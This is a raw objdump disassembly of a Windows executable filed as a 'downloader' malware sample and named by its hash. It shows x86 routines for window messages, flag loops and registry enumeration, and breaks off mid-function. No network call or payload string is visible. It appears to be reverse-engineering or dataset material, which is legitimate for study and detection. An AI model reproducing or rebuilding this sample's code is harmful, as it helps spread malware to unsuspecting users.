
malware_samples/downloader/694910eb637fefdd4de59af9e5b95bfaa099a0580c7a68ae51dda0755a8e0127.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d d4 45 47 00    	mov    0x4745d4,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 80 82 40 00    	call   *0x408280
  401032:	e9 4b 01 00 00       	jmp    0x401182
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 dc 45 47 00    	mov    0x4745dc,%esi
  40103f:	57                   	push   %edi
  401040:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 84 82 40 00    	call   *0x408284
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 88 82 40 00    	call   *0x408288
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 80 40 00    	mov    0x408044,%ebx
  40106e:	e9 89 00 00 00       	jmp    0x4010fc
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	99                   	cltd
  40108a:	f7 ff                	idiv   %edi
  40108c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108f:	0f b6 c0             	movzbl %al,%eax
  401092:	c1 e0 08             	shl    $0x8,%eax
  401095:	89 45 14             	mov    %eax,0x14(%ebp)
  401098:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  40109c:	0f af c1             	imul   %ecx,%eax
  40109f:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  4010a3:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a7:	03 c1                	add    %ecx,%eax
  4010a9:	99                   	cltd
  4010aa:	f7 ff                	idiv   %edi
  4010ac:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4010af:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010b3:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b7:	0f b6 c0             	movzbl %al,%eax
  4010ba:	0b c8                	or     %eax,%ecx
  4010bc:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010c0:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010c4:	03 c2                	add    %edx,%eax
  4010c6:	99                   	cltd
  4010c7:	f7 ff                	idiv   %edi
  4010c9:	c1 e1 08             	shl    $0x8,%ecx
  4010cc:	0f b6 c0             	movzbl %al,%eax
  4010cf:	0b c8                	or     %eax,%ecx
  4010d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010d4:	50                   	push   %eax
  4010d5:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010d8:	ff 15 48 80 40 00    	call   *0x408048
  4010de:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010e2:	50                   	push   %eax
  4010e3:	89 45 14             	mov    %eax,0x14(%ebp)
  4010e6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e9:	50                   	push   %eax
  4010ea:	ff 75 0c             	push   0xc(%ebp)
  4010ed:	ff 15 8c 82 40 00    	call   *0x40828c
  4010f3:	ff 75 14             	push   0x14(%ebp)
  4010f6:	ff d3                	call   *%ebx
  4010f8:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010fc:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010ff:	0f 8c 6e ff ff ff    	jl     0x401073
  401105:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401109:	74 65                	je     0x401170
  40110b:	ff 76 34             	push   0x34(%esi)
  40110e:	ff 15 4c 80 40 00    	call   *0x40804c
  401114:	89 45 14             	mov    %eax,0x14(%ebp)
  401117:	85 c0                	test   %eax,%eax
  401119:	74 55                	je     0x401170
  40111b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40111e:	6a 01                	push   $0x1
  401120:	57                   	push   %edi
  401121:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  401128:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  40112f:	ff 15 50 80 40 00    	call   *0x408050
  401135:	ff 76 58             	push   0x58(%esi)
  401138:	57                   	push   %edi
  401139:	ff 15 54 80 40 00    	call   *0x408054
  40113f:	ff 75 14             	push   0x14(%ebp)
  401142:	8b 35 58 80 40 00    	mov    0x408058,%esi
  401148:	57                   	push   %edi
  401149:	ff d6                	call   *%esi
  40114b:	68 20 08 00 00       	push   $0x820
  401150:	89 45 0c             	mov    %eax,0xc(%ebp)
  401153:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401156:	50                   	push   %eax
  401157:	6a ff                	push   $0xffffffff
  401159:	68 c0 c5 46 00       	push   $0x46c5c0
  40115e:	57                   	push   %edi
  40115f:	ff 15 90 82 40 00    	call   *0x408290
  401165:	ff 75 0c             	push   0xc(%ebp)
  401168:	57                   	push   %edi
  401169:	ff d6                	call   *%esi
  40116b:	ff 75 14             	push   0x14(%ebp)
  40116e:	ff d3                	call   *%ebx
  401170:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401173:	50                   	push   %eax
  401174:	ff 75 08             	push   0x8(%ebp)
  401177:	ff 15 94 82 40 00    	call   *0x408294
  40117d:	5f                   	pop    %edi
  40117e:	5e                   	pop    %esi
  40117f:	33 c0                	xor    %eax,%eax
  401181:	5b                   	pop    %ebx
  401182:	c9                   	leave
  401183:	c2 10 00             	ret    $0x10
  401186:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40118a:	a1 e8 45 47 00       	mov    0x4745e8,%eax
  40118f:	8b d1                	mov    %ecx,%edx
  401191:	69 d2 20 40 00 00    	imul   $0x4020,%edx,%edx
  401197:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  40119b:	f6 c2 02             	test   $0x2,%dl
  40119e:	74 55                	je     0x4011f5
  4011a0:	56                   	push   %esi
  4011a1:	57                   	push   %edi
  4011a2:	8d 71 01             	lea    0x1(%ecx),%esi
  4011a5:	33 ff                	xor    %edi,%edi
  4011a7:	3b 35 ec 45 47 00    	cmp    0x4745ec,%esi
  4011ad:	73 44                	jae    0x4011f3
  4011af:	8b ce                	mov    %esi,%ecx
  4011b1:	69 c9 20 40 00 00    	imul   $0x4020,%ecx,%ecx
  4011b7:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011bb:	53                   	push   %ebx
  4011bc:	8b 08                	mov    (%eax),%ecx
  4011be:	f6 c1 02             	test   $0x2,%cl
  4011c1:	74 03                	je     0x4011c6
  4011c3:	47                   	inc    %edi
  4011c4:	eb 1e                	jmp    0x4011e4
  4011c6:	f6 c1 04             	test   $0x4,%cl
  4011c9:	74 09                	je     0x4011d4
  4011cb:	8b cf                	mov    %edi,%ecx
  4011cd:	4f                   	dec    %edi
  4011ce:	85 c9                	test   %ecx,%ecx
  4011d0:	74 20                	je     0x4011f2
  4011d2:	eb 10                	jmp    0x4011e4
  4011d4:	f6 c1 10             	test   $0x10,%cl
  4011d7:	75 0b                	jne    0x4011e4
  4011d9:	8b d9                	mov    %ecx,%ebx
  4011db:	33 da                	xor    %edx,%ebx
  4011dd:	83 e3 01             	and    $0x1,%ebx
  4011e0:	33 d9                	xor    %ecx,%ebx
  4011e2:	89 18                	mov    %ebx,(%eax)
  4011e4:	46                   	inc    %esi
  4011e5:	05 20 40 00 00       	add    $0x4020,%eax
  4011ea:	3b 35 ec 45 47 00    	cmp    0x4745ec,%esi
  4011f0:	72 ca                	jb     0x4011bc
  4011f2:	5b                   	pop    %ebx
  4011f3:	5f                   	pop    %edi
  4011f4:	5e                   	pop    %esi
  4011f5:	c2 04 00             	ret    $0x4
  4011f8:	55                   	push   %ebp
  4011f9:	8b ec                	mov    %esp,%ebp
  4011fb:	51                   	push   %ecx
  4011fc:	51                   	push   %ecx
  4011fd:	8b 55 08             	mov    0x8(%ebp),%edx
  401200:	53                   	push   %ebx
  401201:	8b 1d e8 45 47 00    	mov    0x4745e8,%ebx
  401207:	56                   	push   %esi
  401208:	8b f2                	mov    %edx,%esi
  40120a:	69 f6 20 40 00 00    	imul   $0x4020,%esi,%esi
  401210:	03 f3                	add    %ebx,%esi
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	33 c9                	xor    %ecx,%ecx
  401217:	57                   	push   %edi
  401218:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40121b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40121e:	a8 02                	test   $0x2,%al
  401220:	74 0c                	je     0x40122e
  401222:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  401225:	74 07                	je     0x40122e
  401227:	83 e0 be             	and    $0xffffffbe,%eax
  40122a:	89 46 08             	mov    %eax,0x8(%esi)
  40122d:	42                   	inc    %edx
  40122e:	3b 15 ec 45 47 00    	cmp    0x4745ec,%edx
  401234:	73 44                	jae    0x40127a
  401236:	8b c2                	mov    %edx,%eax
  401238:	69 c0 20 40 00 00    	imul   $0x4020,%eax,%eax
  40123e:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401242:	8b 0f                	mov    (%edi),%ecx
  401244:	8d 42 01             	lea    0x1(%edx),%eax
  401247:	f6 c1 02             	test   $0x2,%cl
  40124a:	74 0a                	je     0x401256
  40124c:	6a 01                	push   $0x1
  40124e:	52                   	push   %edx
  40124f:	e8 a4 ff ff ff       	call   0x4011f8
  401254:	8b 0f                	mov    (%edi),%ecx
  401256:	f6 c1 04             	test   $0x4,%cl
  401259:	75 28                	jne    0x401283
  40125b:	f6 c1 40             	test   $0x40,%cl
  40125e:	74 03                	je     0x401263
  401260:	ff 45 fc             	incl   -0x4(%ebp)
  401263:	f6 c1 01             	test   $0x1,%cl
  401266:	74 05                	je     0x40126d
  401268:	ff 45 fc             	incl   -0x4(%ebp)
  40126b:	eb 03                	jmp    0x401270
  40126d:	ff 45 f8             	incl   -0x8(%ebp)
  401270:	8b d0                	mov    %eax,%edx
  401272:	3b 05 ec 45 47 00    	cmp    0x4745ec,%eax
  401278:	72 bc                	jb     0x401236
  40127a:	33 c0                	xor    %eax,%eax
  40127c:	5f                   	pop    %edi
  40127d:	5e                   	pop    %esi
  40127e:	5b                   	pop    %ebx
  40127f:	c9                   	leave
  401280:	c2 08 00             	ret    $0x8
  401283:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401287:	74 f3                	je     0x40127c
  401289:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40128d:	74 06                	je     0x401295
  40128f:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401293:	eb e7                	jmp    0x40127c
  401295:	8b 4e 08             	mov    0x8(%esi),%ecx
  401298:	81 e1 7f ff ff ff    	and    $0xffffff7f,%ecx
  40129e:	83 c9 01             	or     $0x1,%ecx
  4012a1:	89 4e 08             	mov    %ecx,0x8(%esi)
  4012a4:	eb d6                	jmp    0x40127c
  4012a6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4012aa:	a1 e8 45 47 00       	mov    0x4745e8,%eax
  4012af:	56                   	push   %esi
  4012b0:	33 f6                	xor    %esi,%esi
  4012b2:	83 f9 20             	cmp    $0x20,%ecx
  4012b5:	73 36                	jae    0x4012ed
  4012b7:	39 35 ec 45 47 00    	cmp    %esi,0x4745ec
  4012bd:	76 2e                	jbe    0x4012ed
  4012bf:	8d 50 08             	lea    0x8(%eax),%edx
  4012c2:	57                   	push   %edi
  4012c3:	8b 02                	mov    (%edx),%eax
  4012c5:	a8 06                	test   $0x6,%al
  4012c7:	75 14                	jne    0x4012dd
  4012c9:	33 ff                	xor    %edi,%edi
  4012cb:	47                   	inc    %edi
  4012cc:	d3 e7                	shl    %cl,%edi
  4012ce:	85 7a fc             	test   %edi,-0x4(%edx)
  4012d1:	74 05                	je     0x4012d8
  4012d3:	83 c8 01             	or     $0x1,%eax
  4012d6:	eb 03                	jmp    0x4012db
  4012d8:	83 e0 fe             	and    $0xfffffffe,%eax
  4012db:	89 02                	mov    %eax,(%edx)
  4012dd:	46                   	inc    %esi
  4012de:	81 c2 20 40 00 00    	add    $0x4020,%edx
  4012e4:	3b 35 ec 45 47 00    	cmp    0x4745ec,%esi
  4012ea:	72 d7                	jb     0x4012c3
  4012ec:	5f                   	pop    %edi
  4012ed:	5e                   	pop    %esi
  4012ee:	c2 04 00             	ret    $0x4
  4012f1:	55                   	push   %ebp
  4012f2:	8b ec                	mov    %esp,%ebp
  4012f4:	83 ec 0c             	sub    $0xc,%esp
  4012f7:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  4012fc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401300:	53                   	push   %ebx
  401301:	56                   	push   %esi
  401302:	05 94 00 00 00       	add    $0x94,%eax
  401307:	57                   	push   %edi
  401308:	8b 3d ec 45 47 00    	mov    0x4745ec,%edi
  40130e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401311:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401314:	33 db                	xor    %ebx,%ebx
  401316:	39 18                	cmp    %ebx,(%eax)
  401318:	74 4b                	je     0x401365
  40131a:	3b df                	cmp    %edi,%ebx
  40131c:	73 45                	jae    0x401363
  40131e:	8b 35 e8 45 47 00    	mov    0x4745e8,%esi
  401324:	83 c6 08             	add    $0x8,%esi
  401327:	8b 16                	mov    (%esi),%edx
  401329:	f6 c2 06             	test   $0x6,%dl
  40132c:	75 28                	jne    0x401356
  40132e:	8b 45 08             	mov    0x8(%ebp),%eax
  401331:	85 c0                	test   %eax,%eax
  401333:	74 06                	je     0x40133b
  401335:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  401339:	74 1b                	je     0x401356
  40133b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40133e:	33 c0                	xor    %eax,%eax
  401340:	40                   	inc    %eax
  401341:	d3 e0                	shl    %cl,%eax
  401343:	8b 4e fc             	mov    -0x4(%esi),%ecx
  401346:	83 e2 01             	and    $0x1,%edx
  401349:	23 c8                	and    %eax,%ecx
  40134b:	8b c1                	mov    %ecx,%eax
  40134d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401350:	d3 e2                	shl    %cl,%edx
  401352:	3b c2                	cmp    %edx,%eax
  401354:	75 0b                	jne    0x401361
  401356:	43                   	inc    %ebx
  401357:	81 c6 20 40 00 00    	add    $0x4020,%esi
  40135d:	3b df                	cmp    %edi,%ebx
  40135f:	72 c6                	jb     0x401327
  401361:	3b df                	cmp    %edi,%ebx
  401363:	74 0d                	je     0x401372
  401365:	ff 45 fc             	incl   -0x4(%ebp)
  401368:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40136c:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401370:	72 9f                	jb     0x401311
  401372:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401375:	5f                   	pop    %edi
  401376:	5e                   	pop    %esi
  401377:	5b                   	pop    %ebx
  401378:	c9                   	leave
  401379:	c2 04 00             	ret    $0x4
  40137c:	8b 44 24 04          	mov    0x4(%esp),%eax
  401380:	85 c0                	test   %eax,%eax
  401382:	7d 14                	jge    0x401398
  401384:	40                   	inc    %eax
  401385:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  40138b:	b9 00 50 47 00       	mov    $0x475000,%ecx
  401390:	2b c8                	sub    %eax,%ecx
  401392:	51                   	push   %ecx
  401393:	e8 97 4b 00 00       	call   0x405f2f
  401398:	c2 04 00             	ret    $0x4
  40139b:	55                   	push   %ebp
  40139c:	8b ec                	mov    %esp,%ebp
  40139e:	83 ec 10             	sub    $0x10,%esp
  4013a1:	53                   	push   %ebx
  4013a2:	56                   	push   %esi
  4013a3:	57                   	push   %edi
  4013a4:	33 ff                	xor    %edi,%edi
  4013a6:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4013a9:	0f 8c 21 01 00 00    	jl     0x4014d0
  4013af:	8b 1d 4c 81 40 00    	mov    0x40814c,%ebx
  4013b5:	8b 45 08             	mov    0x8(%ebp),%eax
  4013b8:	8b 0d f0 45 47 00    	mov    0x4745f0,%ecx
  4013be:	6b c0 1c             	imul   $0x1c,%eax,%eax
  4013c1:	03 c1                	add    %ecx,%eax
  4013c3:	83 38 01             	cmpl   $0x1,(%eax)
  4013c6:	0f 84 04 01 00 00    	je     0x4014d0
  4013cc:	50                   	push   %eax
  4013cd:	e8 8a 02 00 00       	call   0x40165c
  4013d2:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  4013d7:	3b c1                	cmp    %ecx,%eax
  4013d9:	0f 84 fa 00 00 00    	je     0x4014d9
  4013df:	50                   	push   %eax
  4013e0:	e8 97 ff ff ff       	call   0x40137c
  4013e5:	8b f0                	mov    %eax,%esi
  4013e7:	3b f7                	cmp    %edi,%esi
  4013e9:	75 08                	jne    0x4013f3
  4013eb:	33 f6                	xor    %esi,%esi
  4013ed:	46                   	inc    %esi
  4013ee:	ff 45 08             	incl   0x8(%ebp)
  4013f1:	eb 09                	jmp    0x4013fc
  4013f3:	8b 45 08             	mov    0x8(%ebp),%eax
  4013f6:	4e                   	dec    %esi
  4013f7:	89 75 08             	mov    %esi,0x8(%ebp)
  4013fa:	2b f0                	sub    %eax,%esi
  4013fc:	39 3d 10 a2 43 00    	cmp    %edi,0x43a210
  401402:	0f 84 91 00 00 00    	je     0x401499
  401408:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40140b:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40140e:	33 c0                	xor    %eax,%eax
  401410:	83 3d a4 c5 46 00 00 	cmpl   $0x0,0x46c5a4
  401417:	8d 7d f4             	lea    -0xc(%ebp),%edi
  40141a:	ab                   	stos   %eax,%es:(%edi)
  40141b:	ab                   	stos   %eax,%es:(%edi)
  40141c:	75 2c                	jne    0x40144a
  40141e:	8b 0d ec 45 47 00    	mov    0x4745ec,%ecx
  401424:	a1 e8 45 47 00       	mov    0x4745e8,%eax
  401429:	33 d2                	xor    %edx,%edx
  40142b:	85 c9                	test   %ecx,%ecx
  40142d:	74 15                	je     0x401444
  40142f:	83 c0 10             	add    $0x10,%eax
  401432:	49                   	dec    %ecx
  401433:	f6 40 f8 01          	testb  $0x1,-0x8(%eax)
  401437:	74 02                	je     0x40143b
  401439:	03 10                	add    (%eax),%edx
  40143b:	05 20 40 00 00       	add    $0x4020,%eax
  401440:	85 c9                	test   %ecx,%ecx
  401442:	75 ee                	jne    0x401432
  401444:	89 15 a4 c5 46 00    	mov    %edx,0x46c5a4
  40144a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40144e:	a1 ac c5 46 00       	mov    0x46c5ac,%eax
  401453:	75 06                	jne    0x40145b
  401455:	01 35 ac c5 46 00    	add    %esi,0x46c5ac
  40145b:	ff 35 a4 c5 46 00    	push   0x46c5a4
  401461:	03 c6                	add    %esi,%eax
  401463:	68 30 75 00 00       	push   $0x7530
  401468:	50                   	push   %eax
  401469:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  401470:	ff d3                	call   *%ebx
  401472:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401475:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401478:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40147b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40147e:	50                   	push   %eax
  40147f:	ff 75 0c             	push   0xc(%ebp)
  401482:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  401489:	6a 4a                	push   $0x4a
  40148b:	ff 35 10 a2 43 00    	push   0x43a210
  401491:	ff 15 7c 82 40 00    	call   *0x40827c
  401497:	33 ff                	xor    %edi,%edi
  401499:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40149c:	74 29                	je     0x4014c7
  40149e:	01 35 ac c5 46 00    	add    %esi,0x46c5ac
  4014a4:	57                   	push   %edi
  4014a5:	ff 35 a4 c5 46 00    	push   0x46c5a4
  4014ab:	68 30 75 00 00       	push   $0x7530
  4014b0:	ff 35 ac c5 46 00    	push   0x46c5ac
  4014b6:	ff d3                	call   *%ebx
  4014b8:	50                   	push   %eax
  4014b9:	68 02 04 00 00       	push   $0x402
  4014be:	ff 75 0c             	push   0xc(%ebp)
  4014c1:	ff 15 7c 82 40 00    	call   *0x40827c
  4014c7:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4014ca:	0f 8d e5 fe ff ff    	jge    0x4013b5
  4014d0:	33 c0                	xor    %eax,%eax
  4014d2:	5f                   	pop    %edi
  4014d3:	5e                   	pop    %esi
  4014d4:	5b                   	pop    %ebx
  4014d5:	c9                   	leave
  4014d6:	c2 08 00             	ret    $0x8
  4014d9:	8b c1                	mov    %ecx,%eax
  4014db:	eb f5                	jmp    0x4014d2
  4014dd:	8b 44 24 04          	mov    0x4(%esp),%eax
  4014e1:	8b 0d dc 45 47 00    	mov    0x4745dc,%ecx
  4014e7:	6a 00                	push   $0x0
  4014e9:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  4014ed:	e8 a9 fe ff ff       	call   0x40139b
  4014f2:	c2 04 00             	ret    $0x4
  4014f5:	68 d0 e0 40 00       	push   $0x40e0d0
  4014fa:	ff 74 24 08          	push   0x8(%esp)
  4014fe:	e8 8f 39 00 00       	call   0x404e92
  401503:	c2 04 00             	ret    $0x4
  401506:	a1 c4 a0 40 00       	mov    0x40a0c4,%eax
  40150b:	ff 34 88             	push   (%eax,%ecx,4)
  40150e:	6a 00                	push   $0x0
  401510:	e8 3b 51 00 00       	call   0x406650
  401515:	50                   	push   %eax
  401516:	e8 14 4a 00 00       	call   0x405f2f
  40151b:	c3                   	ret
  40151c:	8b c6                	mov    %esi,%eax
  40151e:	85 f6                	test   %esi,%esi
  401520:	7d 02                	jge    0x401524
  401522:	f7 d8                	neg    %eax
  401524:	8b 15 c4 a0 40 00    	mov    0x40a0c4,%edx
  40152a:	8b c8                	mov    %eax,%ecx
  40152c:	c1 f8 04             	sar    $0x4,%eax
  40152f:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  401535:	57                   	push   %edi
  401536:	83 e1 0f             	and    $0xf,%ecx
  401539:	ff 34 8a             	push   (%edx,%ecx,4)
  40153c:	05 c8 a0 40 00       	add    $0x40a0c8,%eax
  401541:	50                   	push   %eax
  401542:	e8 09 51 00 00       	call   0x406650
  401547:	8b f8                	mov    %eax,%edi
  401549:	85 f6                	test   %esi,%esi
  40154b:	7d 06                	jge    0x401553
  40154d:	57                   	push   %edi
  40154e:	e8 1a 4b 00 00       	call   0x40606d
  401553:	8b c7                	mov    %edi,%eax
  401555:	5f                   	pop    %edi
  401556:	c3                   	ret
  401557:	55                   	push   %ebp
  401558:	8b ec                	mov    %esp,%ebp
  40155a:	81 ec 10 02 00 00    	sub    $0x210,%esp
  401560:	53                   	push   %ebx
  401561:	56                   	push   %esi
  401562:	57                   	push   %edi
  401563:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401566:	50                   	push   %eax
  401567:	a1 b0 46 47 00       	mov    0x4746b0,%eax
  40156c:	83 c8 08             	or     $0x8,%eax
  40156f:	50                   	push   %eax
  401570:	33 db                	xor    %ebx,%ebx
  401572:	53                   	push   %ebx
  401573:	ff 75 0c             	push   0xc(%ebp)
  401576:	ff 75 08             	push   0x8(%ebp)
  401579:	ff 15 04 80 40 00    	call   *0x408004
  40157f:	3b c3                	cmp    %ebx,%eax
  401581:	75 69                	jne    0x4015ec
  401583:	8b 35 00 80 40 00    	mov    0x408000,%esi
  401589:	bf 05 01 00 00       	mov    $0x105,%edi
  40158e:	eb 19                	jmp    0x4015a9
  401590:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  401593:	75 4b                	jne    0x4015e0
  401595:	53                   	push   %ebx
  401596:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40159c:	50                   	push   %eax
  40159d:	ff 75 fc             	push   -0x4(%ebp)
  4015a0:	e8 b2 ff ff ff       	call   0x401557
  4015a5:	85 c0                	test   %eax,%eax
  4015a7:	75 12                	jne    0x4015bb
  4015a9:	57                   	push   %edi
  4015aa:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4015b0:	50                   	push   %eax
  4015b1:	53                   	push   %ebx
  4015b2:	ff 75 fc             	push   -0x4(%ebp)
  4015b5:	ff d6                	call   *%esi
  4015b7:	85 c0                	test   %eax,%eax
  4015b9:	74 d5                	je     0x401590
  4015bb:	ff 75 fc             	push   -0x4(%ebp)
  4015be:	ff 15 08 80 40 00    	call   *0x408008
  4015c4:	6a 02                	push   $0x2
  4015c6:	e8 7a 4b 00 00       	call   0x406145
  4015cb:	3b c3                	cmp    %ebx,%eax
  4015cd:	74 24                	je     0x4015f3
  4015cf:	53                   	push   %ebx
  4015d0:	ff 35 b0 46 47 00    	push   0x4746b0
  4015d6:	ff 75 0c             	push   0xc(%ebp)
  4015d9:	ff 75 08             	push   0x8(%ebp)
  4015dc:	ff d0                	call   *%eax
  4015de:	eb 0c                	jmp    0x4015ec
  4015e0:	ff 75 fc             	push   -0x4(%ebp)
  4015e3:	ff 15 08 80 40 00    	call   *0x408008
  4015e9:	33 c0                	xor    %eax,%eax
  4015eb:	40                   	inc    %eax
  4015ec:	5f                   	pop    %edi
  4015ed:	5e                   	pop    %esi
  4015ee:	5b                   	pop    %ebx
  4015ef:	c9                   	leave
  4015f0:	c2 0c 00             	ret    $0xc
  4015f3:	39 1d b0 46 47 00    	cmp    %ebx,0x4746b0
  4015f9:	75 ee                	jne    0x4015e9
  4015fb:	ff 75 0c             	push   0xc(%ebp)
  4015fe:	ff 75 08             	push   0x8(%ebp)
  401601:	ff 15 0c 80 40 00    	call   *0x40800c
  401607:	85 c0                	test   %eax,%eax
  401609:	75 de                	jne    0x4015e9
  40160b:	eb df                	jmp    0x4015ec
  40160d:	55                   	push   %ebp
  40160e:	8b ec                	mov    %esp,%ebp
  401610:	a1 c4 a0 40 00       	mov    0x40a0c4,%eax
  401615:	8b 40 04             	mov    0x4(%eax),%eax
  401618:	56                   	push   %esi
  401619:	57                   	push   %edi
  40161a:	85 c0                	test   %eax,%eax
  40161c:	74 04                	je     0x401622
  40161e:	8b f8                	mov    %eax,%edi
  401620:	eb 0c                	jmp    0x40162e
  401622:	8b 3d 84 46 47 00    	mov    0x474684,%edi
  401628:	81 c7 01 00 00 80    	add    $0x80000001,%edi
  40162e:	8d 45 08             	lea    0x8(%ebp),%eax
  401631:	50                   	push   %eax
  401632:	a1 b0 46 47 00       	mov    0x4746b0,%eax
  401637:	0b 45 08             	or     0x8(%ebp),%eax
  40163a:	50                   	push   %eax
  40163b:	6a 00                	push   $0x0
  40163d:	6a 22                	push   $0x22
  40163f:	5e                   	pop    %esi
  401640:	e8 d7 fe ff ff       	call   0x40151c
  401645:	50                   	push   %eax
  401646:	57                   	push   %edi
  401647:	ff 15 04 80 40 00    	call   *0x408004
  40164d:	f7 d8                	neg    %eax
  40164f:	1b c0                	sbb    %eax,%eax
  401651:	f7 d0                	not    %eax
  401653:	23 45 08             	and    0x8(%ebp),%eax
  401656:	5f                   	pop    %edi
  401657:	5e                   	pop    %esi
  401658:	5d                   	pop    %ebp
  401659:	c2 04 00             	ret    $0x4
  40165c:	55                   	push   %ebp
  40165d:	8b ec                	mov    %esp,%ebp
  40165f:	81 ec a4 02 00 00    	sub    $0x2a4,%esp
  401665:	a1 d4 45 47 00       	mov    0x4745d4,%eax
  40166a:	53                   	push   %ebx
  40166b:	56                   	push   %esi
  40166c:	8b 75 08             	mov    0x8(%ebp),%esi
  40166f:	57                   	push   %edi
  401670:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401674:	6a 07                	push   $0x7
  401676:	59                   	pop    %ecx
  401677:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40167a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40167c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40167f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401682:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401685:	8b f8                	mov    %eax,%edi
  401687:	8b da                	mov    %edx,%ebx
  401689:	69 ff 08 40 00 00    	imul   $0x4008,%edi,%edi
  40168f:	69 db 08 40 00 00    	imul   $0x4008,%ebx,%ebx
  401695:	b9 00 50 47 00       	mov    $0x475000,%ecx
  40169a:	03 f9                	add    %ecx,%edi
  40169c:	03 d9                	add    %ecx,%ebx
  40169e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
